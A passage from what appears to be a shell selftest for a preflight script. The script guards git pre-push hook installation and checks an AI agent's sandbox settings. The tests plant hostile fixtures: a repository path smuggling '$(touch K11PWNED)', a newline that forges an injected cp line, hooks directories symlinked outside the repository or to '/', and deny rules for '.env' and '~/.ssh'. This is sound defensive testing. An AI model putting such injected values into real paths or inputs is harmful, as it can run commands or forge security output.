  _q1sfx='pkg$(touch K11PWNED)x'
  d=$(k11_fx incepted none "$_q1sfx") || d=""
  [ -n "$d" ] || { echo "FAIL: K11/Q1 fixture unbuildable (mktemp -d / rename failed) — its assertions are void"; fail=1; d=$K11_NOFX; }
  _mpd=$( CDPATH='' cd -- "$d" 2>/dev/null && pwd -P ) || _mpd="$d"
  out=$(k11_mp "$d") || out="<k11_mp aborted>"
  _q1pwned=0; [ -e "$d/K11PWNED" ] && _q1pwned=1
  rm -rf "$d" 2>/dev/null || true
  _mprc=${out##*MP_RC=}
  case "$out" in
    *"cp \"$_mpd/hooks/pre-push\""*)
      echo "FAIL: K11/Q1 the install command DOUBLE-quotes an interpolated path — a repo root carrying \$(…) executes on paste (measured: it created the file) ($out)"; fail=1 ;;
    *"cp '$_mpd/hooks/pre-push' '$_mpd/.git/hooks/pre-push'"*)
      if [ "$_mprc" = 1 ]; then
        echo "PASS: K11/Q1 a repository path containing \$(…) is POSIX-single-quoted in the emitted command — inert on paste, and the run still exits 1"
      else
        echo "FAIL: K11/Q1 the quoted command printed but the run did not exit 1 (rc=$_mprc) ($out)"; fail=1
      fi ;;
    *) echo "FAIL: K11/Q1 a \$(…)-bearing repository path produced neither the double-quoted nor the single-quoted install command (rc=$_mprc) ($out)"; fail=1 ;;
  esac
  # SECOND, INDEPENDENT CLAIM: preflight itself must not have EXECUTED the payload while merely
  # reporting on the path. This one is not about the printed line at all, and no wording change can
  # satisfy it — the file either exists or it does not.
  if [ "$_q1pwned" = 0 ]; then
    echo "PASS: K11/Q1 preflight did not itself execute the \$(…) payload embedded in the repository path"
  else
    echo "FAIL: K11/Q1 preflight EXECUTED a command substitution embedded in the repository's own path while reporting on it"; fail=1
  fi

  # MP12 (found WHILE fixing Y1, by re-running the reviewer's own fixture against the fixed tree) —
  # THE EMITTED COMMAND MUST BE ABSOLUTE EVEN WHEN `.git/hooks` DOES NOT EXIST.
  # This defect is older than the fix-loop, but it was UNREACHABLE until Y1: a repo with a no-op
  # core.hooksPath and no default hooks dir used to take the disclosed skip, so the refusal never ran
  # there. With Y1 fixed it does run — and the absolutizer resolved only the path's PARENT, which is
  # exactly the component that is missing here. MEASURED: the refusal emitted
  # `mkdir -p '.git/hooks' && cp '<abs>/hooks/pre-push' '.git/hooks/pre-push'` — a RELATIVE destination
  # in a paste-able command, i.e. the §4.5 broken-paste defect W3 and MP5 exist for, silently targeting
  # whatever tree the reader happens to be in.
  # A FIX THAT MAKES A NEW PATH REACHABLE MUST BE RE-RUN AGAINST THE FIXTURE THAT REACHES IT — that is
  # the whole finding, and this leg is what stops it regressing.
  d=$(k11_fx incepted hookspath-noop-nodir) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/MP12 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  _mpd=$( CDPATH='' cd -- "$d" 2>/dev/null && pwd -P ) || _mpd="$d"
  out=$(k11_mp "$d") || out="<k11_mp aborted>"
  rm -rf "$d" 2>/dev/null || true
  _mprc=${out##*MP_RC=}
  case "$out" in
    *"mkdir -p '.git/hooks'"*|*"'.git/hooks/pre-push'"*)
      echo "FAIL: K11/MP12 the install command names a RELATIVE .git/hooks — pasted from anywhere but preflight's own cwd it targets the wrong tree (§4.5) ($out)"; fail=1 ;;
    *"mkdir -p '$_mpd/.git/hooks' && cp '$_mpd/hooks/pre-push' '$_mpd/.git/hooks/pre-push'"*)
      if [ "$_mprc" = 1 ]; then
        echo "PASS: K11/MP12 a repo whose .git/hooks does not exist still gets a fully ABSOLUTE install command (the deep resolver walks past the missing component)"
      else
        echo "FAIL: K11/MP12 the absolute command printed but the run did not exit 1 (rc=$_mprc) ($out)"; fail=1
      fi ;;
    *) echo "FAIL: K11/MP12 a repo with a no-op core.hooksPath and no .git/hooks produced neither a relative nor an absolute install command (rc=$_mprc) ($out)"; fail=1 ;;
  esac

  # D2 (security re-review, finding M-1) — D1's defence, ONE PATH COMPONENT UP. `[ -h "$GUARD_HOOK" ]`
  # tests the LEAF, so a `.git/hooks` DIRECTORY symlink escapes it entirely and the refusal offered
  # `mkdir -p '<outside>' && cp … && chmod +x …` — the same executable-outside-the-repository outcome D1
  # exists to prevent, reached by a route D1 cannot see. Lives HERE rather than beside D1 because the
  # claim is about the COMMAND the main body emits, and `k11_mp` (the whole-script driver) is not defined
  # until this block; a function-level `k11_run` never reaches the emitted command at all.
  # THE NEGATIVE HALF IS THE LOAD-BEARING ONE, as it is in D1: the escaped directory must appear in NO
  # runnable line. A wording change alone would leave the paste intact, and it is the paste that escapes.
  d=$(k11_fx incepted hooks-dir-symlink) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/D2 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  _mpd=$( CDPATH='' cd -- "$d" 2>/dev/null && pwd -P ) || _mpd="$d"
  _d2esc=$( CDPATH='' cd -- "$d-escaped-hooks" 2>/dev/null && pwd -P ) || _d2esc="$_mpd-escaped-hooks"
  # BOTH DRIVERS AGAINST THE ONE FIXTURE. k11_run is the only one that can see GUARD_STATE (it prints
  # the trailer; the whole-script run has no such channel), and k11_mp is the only one that reaches the
  # emitted command. Asserting the state without the command would be D1's mistake repeated — it is the
  # command that escapes.
  outr=$(k11_run "$d") || outr="<k11_run aborted>"
  out=$(k11_mp "$d") || out="<k11_mp aborted>"
  # BOTH removed: the escape target is a SIBLING of the fixture root, so `rm -rf "$d"` alone would leak
  # it into TMPDIR. Guarded against the unbuildable sentinel the same way every other rm here is.
  rm -rf "$d" 2>/dev/null || true
  case "$d" in /dev/null/*) : ;; *) [ -z "$d" ] || rm -rf "$d-escaped-hooks" 2>/dev/null || true ;; esac
  _mprc=${out##*MP_RC=}
  case "$outr" in
    *"GUARD_REFUSE=1 GUARD_STATE=hooks-escape"*)
      echo "PASS: K11/D2 a .git/hooks directory symlink resolving outside the git dir gets its OWN state (hooks-escape), not 'absent' — the state is what selects the fix line" ;;
    *"GUARD_REFUSE=1 GUARD_STATE=absent"*)
      echo "FAIL: K11/D2 a .git/hooks DIRECTORY SYMLINK was still classified 'absent' — that state selects the cp arm, whose paste writes an executable outside the repository ($outr)"; fail=1 ;;
    *) echo "FAIL: K11/D2 a .git/hooks directory symlink armed neither the hooks-escape state nor the absent misclassification ($outr)"; fail=1 ;;
  esac
  case "$out" in
    *"cp '$_mpd/hooks/pre-push' '$_d2esc/pre-push'"*|*"mkdir -p '$_d2esc'"*|*"chmod +x '$_d2esc/pre-push'"*)
      echo "FAIL: K11/D2 a .git/hooks DIRECTORY SYMLINK got an install command writing an executable to $_d2esc — OUTSIDE the git dir, the exact escape D1 closes one component down ($out)"; fail=1 ;;
    *"HOOKS DIRECTORY"*"NO INSTALL COMMAND IS OFFERED"*)
      if [ "$_mprc" = 1 ]; then
        echo "PASS: K11/D2 the real run offers NO command for an escaped hooks dir — it names the redirection, points at 'ls -ld' on the LINK, and still exits 1"
      else
        echo "FAIL: K11/D2 the escaped-hooks-dir refusal printed but the run did not exit 1 (rc=$_mprc) ($out)"; fail=1
      fi ;;
    *) echo "FAIL: K11/D2 a .git/hooks directory symlink produced neither the escaping install command nor the no-command refusal (rc=$_mprc) ($out)"; fail=1 ;;
  esac

  # MP13 (security re-review, finding LOW-2) — AN INSTALL SOURCE THAT IS NOT A REGULAR FILE MUST NOT BE
  # READ. `guard_is_kit_hook`'s `grep -q` and `guard_sha256`'s hasher both read the source to EOF, and a
  # FIFO with no writer (or a symlink to /dev/zero) has no EOF: MEASURED (2026-07-21) the whole script
  # blocked on `grep -q KIT_GUARD_CORE <fifo>` and never terminated — output stopped after the "no local
  # guard at all" line, rc 142 under a 20 s alarm. Symlinks are tracked git content, so this arrives by
  # PR and stalls any CI job running preflight until the job's own timeout. The destination side has
  # rejected non-regular files since T1 (`[ ! -f "$GUARD_HOOK" ]`); the source side simply never got the
  # same test, which is the partial-application pattern this fix-loop keeps finding.
  # THIS LEG IS ITS OWN LIVENESS PROOF: without the fix it does not fail, it HANGS, so a green selftest
  # trailer at all is part of what it asserts. Its explicit claims are that the run TERMINATES with rc 1,
  # that no `cp` names the non-regular source, and that the refusal says so and names it.
  d=$(k11_fx incepted none-fifo-src) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/MP13 fixture unbuildable (mktemp -d / mkfifo failed) — its assertions are void"; fail=1; d=$K11_NOFX; }
  _mpd=$( CDPATH='' cd -- "$d" 2>/dev/null && pwd -P ) || _mpd="$d"
  out=$(k11_mp "$d") || out="<k11_mp aborted>"
  rm -rf "$d" 2>/dev/null || true
  _mprc=${out##*MP_RC=}
  case "$out" in
    *"cp '$_mpd/hooks/pre-push'"*)
      echo "FAIL: K11/MP13 a NON-REGULAR install source (a FIFO) was offered in a cp line — the paste installs a hook whose content is whatever the writer decides, at paste time ($out)"; fail=1 ;;
    *"NO INSTALL COMMAND IS OFFERED"*"rejected source: $_mpd/hooks/pre-push"*)
      if [ "$_mprc" = 1 ]; then
        echo "PASS: K11/MP13 a NON-REGULAR install source is rejected WITHOUT being read — the run terminates (it used to block forever on grep/shasum) and still exits 1"
      else
        echo "FAIL: K11/MP13 the non-regular source was rejected but the run did not exit 1 (rc=$_mprc) ($out)"; fail=1
      fi ;;
    *) echo "FAIL: K11/MP13 a FIFO install source produced neither a cp line nor the rejection — if this leg never printed at all, the run is BLOCKED on an unbounded read (rc=$_mprc) ($out)"; fail=1 ;;
  esac

  # D3 (security re-review, finding MED-1) — D2's ESCAPE, WITH `/` AS THE TARGET. Same shape, same
  # verdict required; the reason it needs its own leg is that `/` is the one target D2's fixture could
  # never reach. guard_resolve_deep ends `printf '%s\n' "${_grd_abs%/}$_grd_tail"`, and for the root the
  # `%/` strips the ONLY character, so the helper printed the EMPTY STRING WITH RC 0 — a fail-open
  # reached through a SUCCESS path, which is why nothing upstream noticed. guard_hooks_dir_escapes's
  # `[ -n "$_ghe_hd" ] || return 1` (its "unresolvable => not an escape" arm) then skipped containment
  # entirely and the refusal emitted `mkdir -p '/' && cp … '/pre-push' && chmod +x '/pre-push'`.
  # THE NEGATIVE HALF IS THE LOAD-BEARING ONE, as in D1/D2: `/` must appear in NO runnable line.
  # WHY THE FIX IS IN THE RESOLVER AND NOT A SECOND TRIGGER — this is the point of the leg, and it is
  # this file's own named failure mode caught eating its own tail. The `[ -h ]` trigger deleted at
  # guard_hooks_dir_escapes WOULD have caught this shape (`.git/hooks -> /` is a leaf symlink), and it
  # was deleted on a MUTATION RESULT: "every escape it caught, containment caught". That measurement was
  # true of the fixture set it was run against — and that set contained no `/`-resolving shape, so the
  # measurement answered a narrower question than the sentence it justified. A fixture that does not
  # carry the attack's essential property tests something else and reports it as the thing you asked
  # for, which is the finding already written above `hooks-dir-symlink`. The trigger is still NOT
  # reinstated: it would re-introduce the cry-wolf it was deleted for (an in-worktree `shared-hooks`
  # link) and would fix ONE shape of a defect the resolver has for every caller — `_g_lnk` and `_g_hdir`
  # in the refusal block go through the same helper. The general defect is the resolver; this leg is
  # what makes the fixture set carry the property the earlier mutation run lacked.
  d=$(k11_fx incepted hooks-dir-root) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/D3 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  outr=$(k11_run "$d") || outr="<k11_run aborted>"
  out=$(k11_mp "$d") || out="<k11_mp aborted>"
  # The link is unlinked BEFORE the recursive delete. `rm -rf` does not descend into a symlinked
  # directory (measured with a canary tree behind the link), so this is redundant — and it is kept
  # anyway, because the cost of being wrong here is the whole machine's disk.
  rm -f "$d/.git/hooks" 2>/dev/null || true
  rm -rf "$d" 2>/dev/null || true
  _mprc=${out##*MP_RC=}
  case "$outr" in
    *"GUARD_REFUSE=1 GUARD_STATE=hooks-escape"*)
      echo "PASS: K11/D3 a .git/hooks symlinked to / gets the hooks-escape state — the root is the one target whose resolution used to come back EMPTY with rc 0, i.e. 'not an escape'" ;;
    *"GUARD_REFUSE=1 GUARD_STATE=absent"*)
      echo "FAIL: K11/D3 a .git/hooks symlinked to / was still classified 'absent' — the containment test was skipped through guard_resolve_deep's rc-0 empty return ($outr)"; fail=1 ;;
    *) echo "FAIL: K11/D3 a .git/hooks symlinked to / armed neither the hooks-escape state nor the absent misclassification ($outr)"; fail=1 ;;
  esac
  case "$out" in
    *"mkdir -p '/'"*|*"cp '"*"' '/pre-push'"*|*"chmod +x '/pre-push'"*)
      echo "FAIL: K11/D3 a .git/hooks symlinked to / got an install command writing an executable to /pre-push — the filesystem root, outside every repository there is ($out)"; fail=1 ;;
    *"HOOKS DIRECTORY"*"NO INSTALL COMMAND IS OFFERED"*)
      if [ "$_mprc" = 1 ]; then
        echo "PASS: K11/D3 the real run offers NO command for a hooks dir that resolves to /, and still exits 1"
      else
        echo "FAIL: K11/D3 the escaped-hooks-dir refusal printed for / but the run did not exit 1 (rc=$_mprc) ($out)"; fail=1
      fi ;;
    *) echo "FAIL: K11/D3 a .git/hooks symlinked to / produced neither the escaping install command nor the no-command refusal (rc=$_mprc) ($out)"; fail=1 ;;
  esac

  # L2 (security re-review, finding L-2) — A SYMLINKED SOURCE MUST NOT MASK ITS ORIGIN.
  # `source: <top>/hooks/pre-push` reads as the repository's own tracked file. When that path is a
  # symlink, the digest and every inspection the message recommends describe the TARGET — so the facts
  # are true and the PROVENANCE is wrong, which is the harder failure to notice. The operator is being
  # asked to decide whether to make a file executable inside `.git/hooks/`; where that file actually
  # comes from is the decision. NOT a forgery and not scored as one — but a masked origin inside a
  # security verdict is the same family as a rendered excerpt: the reader is given something that looks
  # like evidence and is not what it appears to be.
  d=$(k11_fx incepted none-symlink-src) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/L2 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  _mpd=$( CDPATH='' cd -- "$d" 2>/dev/null && pwd -P ) || _mpd="$d"
  out=$(k11_mp "$d") || out="<k11_mp aborted>"
  rm -rf "$d" 2>/dev/null || true
  _mprc=${out##*MP_RC=}
  case "$out" in
    *"SYMLINK: it points at $_mpd/k11-elsewhere/planted"*)
      if [ "$_mprc" = 1 ]; then
        echo "PASS: K11/L2 a SYMLINKED install source has its real target printed — the in-tree-looking path no longer masks where the file the digest describes actually comes from"
      else
        echo "FAIL: K11/L2 the symlink target printed but the run did not exit 1 (rc=$_mprc) ($out)"; fail=1
      fi ;;
    *"source:  $_mpd/hooks/pre-push"*)
      echo "FAIL: K11/L2 the refusal named '<top>/hooks/pre-push' and stopped there — that path is a SYMLINK, and the digest plus every inspection it recommends describe a DIFFERENT file ($out)"; fail=1 ;;
    *) echo "FAIL: K11/L2 the symlinked-source case named neither the in-tree path nor its target (rc=$_mprc) ($out)"; fail=1 ;;
  esac

  # L2b — RULE 2 ON THE SYMLINK TARGET. L-2's fix prints a path that comes from the FILESYSTEM, which is
  # a new attacker-controlled value entering a security verdict's output; a literal newline in it forges
  # whole lines exactly as it does in the repo path (leg E4). The rejection was written with the fix —
  # and MUTATION-TESTED GREEN, i.e. disabling it changed nothing, because no fixture reached it. That is
  # the "a security fix with no leg is a claim, not a control" case, caught the only way it can be.
  d=$(k11_fx incepted none-symlink-src-nl) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/L2b fixture unbuildable (mktemp -d / newline dir failed) — its assertions are void"; fail=1; d=$K11_NOFX; }
  out=$(k11_mp "$d") || out="<k11_mp aborted>"
  rm -rf "$d" 2>/dev/null || true
  _mprc=${out##*MP_RC=}
  case "$out" in
    *K11LNKFORGED*)
      echo "FAIL: K11/L2b a REAL NEWLINE in the install source's SYMLINK TARGET forged a line into the refusal — the L-2 fix opened the surface Rule 2 exists to close ($out)"; fail=1 ;;
    *"SYMLINK whose target contains a CONTROL CHARACTER"*)
      if [ "$_mprc" = 1 ]; then
        echo "PASS: K11/L2b a symlink target carrying a REAL newline is refused as a control-character path and NEVER printed — the origin is disclosed as unprintable rather than forged, and the run still exits 1"
      else
        echo "FAIL: K11/L2b the hostile-target notice printed but the run did not exit 1 (rc=$_mprc) ($out)"; fail=1
      fi ;;
    *) echo "FAIL: K11/L2b a newline-bearing symlink target produced neither the forged line nor the control-character notice (rc=$_mprc) ($out)"; fail=1 ;;
  esac

  # E4 (finding X3b) — THE REFUSAL-BRANCH FORGERY, end to end. The security review called this the one
  # that fully defeats X1's own mitigation: a LITERAL NEWLINE in the repo root passes straight through
  # `printf '%s\n'` and forged a complete `Fix … cp "/tmp/evil-payload" …` block INSIDE the branch whose
  # entire purpose is to refuse to print one, commenting out the real trailing path with an injected `#`.
  # MEASURED before the fix — and it forged TWICE, at the `hook:` line and again at `rejected source:`.
  # A `printf`-only implementation passes E1 and E2 and fails here; `[[:cntrl:]]` does not match the
  # two-character `\` `n` that E1/E2 use, so neither rule subsumes the other and both need a leg.
  # THE FORGED TEXT CARRIES NO `/`: the payload is a single PATH COMPONENT, and a component containing
  # a slash cannot be created — the first draft used `cp K11FORGED /dev/null #` and `mv` failed with
  # ENOENT, which the unbuildable guard turned into a loud FAIL rather than a vacuous pass. That is the
  # guard working; recorded so the next author does not re-learn it. The claim under test is "a LINE was
  # forged", which needs no working command.
  d=$(k11_fx incepted none-no-src "$(printf 'pkg\n    cp K11FORGED K11DEST #')") || d=""
  [ -n "$d" ] || { echo "FAIL: K11/E4 fixture unbuildable (mktemp -d / rename failed) — its assertions are void"; fail=1; d=$K11_NOFX; }
  out=$(k11_mp "$d") || out="<k11_mp aborted>"
  rm -rf "$d" 2>/dev/null || true
  _mprc=${out##*MP_RC=}
  case "$out" in
    *K11FORGED*)
      echo "FAIL: K11/E4 a REAL NEWLINE in the repository path forged a line into the refusal — the branch that exists to refuse an install command printed one ($out)"; fail=1 ;;
    *"pre-push runtime guard is not in force"*"CONTROL CHARACTER"*)
      if [ "$_mprc" = 1 ]; then
        echo "PASS: K11/E4 a repository path containing a REAL newline is refused WITHOUT the path ever being printed — nothing is forged, and the run still exits 1"
      else
        echo "FAIL: K11/E4 the control-character refusal printed but the run did not exit 1 (rc=$_mprc) ($out)"; fail=1
      fi ;;
    *) echo "FAIL: K11/E4 a newline-bearing repository path produced neither the forged line nor the control-character refusal (rc=$_mprc) ($out)"; fail=1 ;;
  esac
  # E4's ceiling assertion: the hostile-path refusal must ALSO carry the honest ceiling. There is now
  # exactly ONE copy of that paragraph (the state is a `case` arm, not an early exit — see the refusal
  # block), so this and MP1's ceiling assertion die together; both are kept because the arrangement that
  # makes them redundant is itself a design decision a future edit could undo.
  case "$out" in
    *"not a boundary"*"does NOT make main"*"--no-verify"*)
      echo "PASS: K11/E4 the control-character refusal also closes with the honest ceiling (its early exit does not lose the paragraph)" ;;
    *) echo "FAIL: K11/E4 the control-character refusal exits without the honest ceiling — the paragraph is present on one refusal path and missing on another ($out)"; fail=1 ;;
  esac
  fi

  # — the agent's OS sandbox profile (SANDBOX-OFF-BY-DEFAULT-STRICT-OPT-IN). The availability cases run with the sandbox
  # ON (with it off nothing would be checked): available -> no warn;
  # each missing reason -> a warn NAMING it; `miss` is untouched in every case (advisory only).
  _sbx=$(mktemp -d)
  printf '{"sandbox":{"enabled":true}}\n' > "$_sbx/on.json"
  printf '{"sandbox":{"enabled":false}}\n' > "$_sbx/off.json"
  printf '{"permissions":{}}\n' > "$_sbx/noblock.json"
  sbx_case() {  # <label> <expect-substring or ""> <os> <tools> <bwrap_ok> [settings-file] [local-file] [user-file] [managed-file]
    # Called in the CURRENT shell (output to a file, not $( … )) so a stray `miss=` would be seen below.
    miss=0; _sbx_rec=${rec:-0}
    PREFLIGHT_SANDBOX_OS="$3"; PREFLIGHT_SANDBOX_TOOLS="$4"; PREFLIGHT_SANDBOX_BWRAP_OK="$5"
    PREFLIGHT_SANDBOX_SETTINGS="${6:-$_sbx/on.json}"
    PREFLIGHT_SANDBOX_LOCAL="${7:-/nonexistent-local}"
    PREFLIGHT_SANDBOX_USER="${8:-/nonexistent-user}"; PREFLIGHT_SANDBOX_MANAGED="${9:-/nonexistent-managed}"
    export PREFLIGHT_SANDBOX_OS PREFLIGHT_SANDBOX_TOOLS PREFLIGHT_SANDBOX_BWRAP_OK PREFLIGHT_SANDBOX_SETTINGS PREFLIGHT_SANDBOX_LOCAL PREFLIGHT_SANDBOX_USER PREFLIGHT_SANDBOX_MANAGED
    _sbx_out=$(mktemp)
    check_sandbox >"$_sbx_out" 2>&1 || :
    out=$(cat "$_sbx_out"); rm -f "$_sbx_out"
    unset PREFLIGHT_SANDBOX_OS PREFLIGHT_SANDBOX_TOOLS PREFLIGHT_SANDBOX_BWRAP_OK PREFLIGHT_SANDBOX_SETTINGS PREFLIGHT_SANDBOX_LOCAL PREFLIGHT_SANDBOX_USER PREFLIGHT_SANDBOX_MANAGED
    rec=$_sbx_rec
    if [ -z "$2" ]; then
      case "$out" in *warn*) echo "FAIL: sandbox [$1] warned when it should not ($out)"; fail=1 ;; *"ok   agent OS sandbox"*) echo "PASS: sandbox [$1] -> no warn" ;; *) echo "FAIL: sandbox [$1] printed no ok line ($out)"; fail=1 ;; esac
    else
      case "$out" in *warn*"$2"*) echo "PASS: sandbox [$1] -> warn naming '$2'" ;; *) echo "FAIL: sandbox [$1] did not warn naming '$2' ($out)"; fail=1 ;; esac
    fi
    if [ "$miss" -eq 0 ]; then :; else echo "FAIL: sandbox [$1] set miss (the sandbox check must stay advisory)"; fail=1; fi
  }
  sbx_case mac-available "" Darwin "sandbox-exec" 1
  sbx_case mac-missing "sandbox-exec" Darwin "" 1
  sbx_case linux-available "" Linux "bwrap socat" 1
  sbx_case linux-no-bwrap "bubblewrap" Linux "socat" 1
  sbx_case linux-no-socat "socat" Linux "bwrap" 1
  sbx_case linux-userns-blocked "user namespaces" Linux "bwrap socat" 0
  sbx_case other-os "no supported sandbox" Plan9 "" 1
  # The profile line: off when turned off in a scope (and no cannot-start warn, even where no sandbox could start), on via the
  # shipped file or via the local file (scalars: local over project), the local file turning an on project off,
  # and a project file with no sandbox block (off). The old "restore the shipped block" warn is gone.
  printf '{"sandbox":{"enabled":true}}\n' > "$_sbx/local-on.json"
  printf '{"sandbox":{"enabled":false}}\n' > "$_sbx/local-off.json"
  sbx_prof() {  # <label> <off|on> <settings> [local] <os> <tools> <bwrap_ok> [user] [managed] [expected-warn reason]
    sbx_case "$1" "${10:-}" "$5" "$6" "$7" "$3" "${4:-}" "${8:-}" "${9:-}"
    case "$out" in
      *"agent OS sandbox: $2 ("*) echo "PASS: sandbox profile [$1] -> $2" ;;
      *) echo "FAIL: sandbox profile [$1] did not print the $2 line ($out)"; fail=1 ;;
    esac
    case "$out" in
      *"does not set sandbox.enabled"*|*"Restore the shipped block"*) echo "FAIL: sandbox profile [$1] printed the retired restore-the-shipped-block warn ($out)"; fail=1 ;;
    esac
    if [ "$2" = off ]; then
      case "$out" in
        *warn*|*"can start here"*) echo "FAIL: sandbox profile [$1] ran the availability check with the sandbox off ($out)"; fail=1 ;;
      esac
      case "$out" in
        *"the shipped default is on; here it is turned off in a settings scope"*) echo "PASS: sandbox profile [$1] -> the off line says the shipped default is on" ;;
        *) echo "FAIL: sandbox profile [$1] did not print the off line's turned-off-in-a-scope clause ($out)"; fail=1 ;;
      esac
    fi
  }
  sbx_prof profile-off-default off "$_sbx/off.json" "" Plan9 "" 1
  sbx_prof profile-off-no-block off "$_sbx/noblock.json" "" Plan9 "" 1
  sbx_prof profile-strict-shipped on "$_sbx/on.json" "" Darwin "sandbox-exec" 1
  sbx_prof profile-strict-via-local on "$_sbx/off.json" "$_sbx/local-on.json" Darwin "sandbox-exec" 1
  sbx_prof profile-local-turns-off off "$_sbx/on.json" "$_sbx/local-off.json" Plan9 "" 1
  # A project file with no sandbox block is off. A user-level file (~/.claude) turning it
  # on is on when the project file says nothing; precedence is managed > local > project > user.
  sbx_prof profile-off-absent-key off "$_sbx/noblock.json" "" Plan9 "" 1
  sbx_prof profile-strict-via-user on "$_sbx/noblock.json" "" Darwin "sandbox-exec" 1 "$_sbx/on.json"
  sbx_prof profile-project-false-beats-user off "$_sbx/off.json" "" Plan9 "" 1 "$_sbx/on.json"
  sbx_prof profile-strict-via-managed on "$_sbx/noblock.json" "" Darwin "sandbox-exec" 1 "" "$_sbx/on.json"
  sbx_prof profile-managed-beats-local on "$_sbx/noblock.json" "$_sbx/local-off.json" Darwin "sandbox-exec" 1 "" "$_sbx/on.json"
  sbx_prof profile-managed-off-beats-local off "$_sbx/noblock.json" "$_sbx/local-on.json" Plan9 "" 1 "" "$_sbx/off.json"
  # On but unable to start: the profile line AND the warn naming the reason.
  sbx_prof profile-strict-unavailable on "$_sbx/off.json" "$_sbx/local-on.json" Linux "socat" 1 "" "" "bubblewrap"
  case "$out" in
    *warn*"bubblewrap"*) echo "PASS: sandbox profile [profile-strict-unavailable] -> warn naming bubblewrap" ;;
    *) echo "FAIL: sandbox profile [profile-strict-unavailable] did not warn naming bubblewrap ($out)"; fail=1 ;;
  esac
  # SWAS-903: the gh info line shows on macOS with the sandbox on and neither trust variable set; never on Linux, never with a variable set, never a warn.
  unset SSL_CERT_FILE SSL_CERT_DIR
  sbx_prof profile-gh-info-darwin on "$_sbx/on.json" "" Darwin "sandbox-exec" 1
  case "$out" in
    *"info gh:"*"OSStatus -26276"*"SSL_CERT_FILE=/private/etc/ssl/cert.pem gh"*) echo "PASS: sandbox profile [profile-gh-info-darwin] -> the gh info line" ;;
    *) echo "FAIL: sandbox profile [profile-gh-info-darwin] printed no gh info line ($out)"; fail=1 ;;
  esac
  sbx_prof profile-gh-info-linux on "$_sbx/on.json" "" Linux "bwrap socat" 1
  case "$out" in
    *"info gh:"*) echo "FAIL: sandbox profile [profile-gh-info-linux] printed the gh info line on Linux ($out)"; fail=1 ;;
    *) echo "PASS: sandbox profile [profile-gh-info-linux] -> no gh info line" ;;
  esac
  SSL_CERT_FILE=/fixture/cert.pem; export SSL_CERT_FILE
  sbx_prof profile-gh-info-inherited on "$_sbx/on.json" "" Darwin "sandbox-exec" 1
  unset SSL_CERT_FILE
  case "$out" in
    *"info gh:"*) echo "FAIL: sandbox profile [profile-gh-info-inherited] printed the gh info line with SSL_CERT_FILE set ($out)"; fail=1 ;;
    *) echo "PASS: sandbox profile [profile-gh-info-inherited] -> no gh info line" ;;
  esac
  # WIRED: a real run (seams live) with the sandbox on surfaces the warning, and does not change the exit code (advisory).
  sbx_e2e=$(PREFLIGHT_SANDBOX_SETTINGS="$_sbx/on.json" PREFLIGHT_SANDBOX_LOCAL=/nonexistent-local PREFLIGHT_SANDBOX_USER=/nonexistent-user PREFLIGHT_SANDBOX_MANAGED=/nonexistent-managed PREFLIGHT_SANDBOX_OS=Linux PREFLIGHT_SANDBOX_TOOLS='' PREFLIGHT_BOUNDARY_OPTOUT=@absent PREFLIGHT_GH_CMD='false' ACTIONLINT_VALID_CMD='__skip__' sh "$0" --selftest-e2e --boundary-advisory 2>&1) || true
  rm -rf "$_sbx"
  case "$sbx_e2e" in
    *"agent OS sandbox cannot start"*) echo "PASS: a real preflight run surfaces the sandbox warning with the sandbox on" ;;
    *) echo "FAIL: a real preflight run did not surface the sandbox warning with the sandbox on"; fail=1 ;;
  esac
  miss=0

  # — SWAS-354 (352b): the boundary lines. Keys only (a planted token never appears); the user scope, read-denied to an agent's shell, reads
  # UNVERIFIED and never ON; strictAllowlist counts only at user or managed scope; the exit code does not move for a declared or unverified state;
  # under CI only the committed project block is read and the line says so ([declared], never [static]). SWAS-355 cells follow the 354 ones.
  # Every cell clears CI, GITHUB_ACTIONS and SANDBOX_RUNTIME first (a CI runner or an agent session would otherwise leak into the cell).
  st_bnd_setup   # creates $_bnd (once: every fixture below writes into it) and writes off.json; also sets _self, _sd, the _g_* globals and the _bnd_run/_bnd_moves/_bnd_kill helpers
  printf '{"sandbox":{"enabled":true,"filesystem":{"denyRead":["**/.env","~/.ssh"],"denyWrite":["./.claude","~/.claude/settings.json"]}},"permissions":{"deny":["WebFetch"]}}\n' > "$_bnd/full.json"
  printf '{"sandbox":{"enabled":true,"filesystem":{"denyRead":["**/.env","~/.ssh"],"denyWrite":["./.claude"]}}}\n' > "$_bnd/shortwrite.json"
  printf '{"sandbox":{"enabled":true,"filesystem":{"denyWrite":["./.claude","~/.claude/settings.json"]}}}\n' > "$_bnd/noread.json"
  printf '{"permissions":{}}\n' > "$_bnd/noblock.json"
  printf '{"sandbox":{"enabled":true,"network":{"strictAllowlist":true},"filesystem":{"denyRead":["**/.env","~/.ssh"],"denyWrite":["./.claude","~/.claude/settings.json"]}}}\n' > "$_bnd/strictproj.json"
  printf '{"env":{"KIT_TRACKER_TOKEN":"kit-PLANTEDSECRET-placeholder-token"},"sandbox":{"network":{"strictAllowlist":true}}}\n' > "$_bnd/user-strict.json"
  printf '{"env":{"KIT_TRACKER_TOKEN":"kit-PLANTEDSECRET-placeholder-token"}}\n' > "$_bnd/user-plain.json"
  bnd_case() {  # <project> <local> <user> <managed> [runtime|ci] [os] [declaration seam: @absent (default) | @nonregular | a file]: runs check_boundary with the seams; output in $out
    out=$( unset CI GITHUB_ACTIONS SANDBOX_RUNTIME
      PREFLIGHT_SANDBOX_SETTINGS="$1"; PREFLIGHT_SANDBOX_LOCAL="${2:-/nonexistent-local}"; PREFLIGHT_SANDBOX_USER="${3:-/nonexistent-user}"; PREFLIGHT_SANDBOX_MANAGED="${4:-/nonexistent-managed}"
      export PREFLIGHT_SANDBOX_SETTINGS PREFLIGHT_SANDBOX_LOCAL PREFLIGHT_SANDBOX_USER PREFLIGHT_SANDBOX_MANAGED
